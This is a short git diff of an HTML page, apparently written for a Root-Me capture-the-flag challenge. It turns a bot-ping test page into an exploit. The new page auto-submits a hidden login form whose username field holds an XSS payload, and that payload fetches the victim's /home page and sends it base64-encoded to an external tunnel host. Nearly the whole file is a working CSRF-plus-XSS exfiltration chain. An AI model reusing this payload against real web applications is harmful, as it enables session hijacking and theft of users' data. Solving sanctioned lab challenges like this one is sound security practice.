@@ -1,13 +1,14 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>Bot Ping Test</title>
-</head>
-<body>
-    <h1>Testing Bot Visit...</h1>
+  <body>
+    <form id="exploit-form" action="http://challenge01.root-me.org:58039/login" method="POST">
+      <input type="hidden" name="password" value="fakepass" />
+      <input type="hidden" name="_csrf" value="DUMMY_TOKEN" />
 
+      <input type="hidden" name="username" value="<img src=x onerror=&quot;fetch('/home').then(r => r.text()).then(html => { fetch('https://ce154656abfbde.lhr.life/?data=' + btoa(html)); });&quot;>" />
+    </form>
+    
     <script>
-        fetch('https://ce154656abfbde.lhr.life/bot_visited_page');
+      document.getElementById('exploit-form').submit();
     </script>
-</body>
+  </body>
 </html>
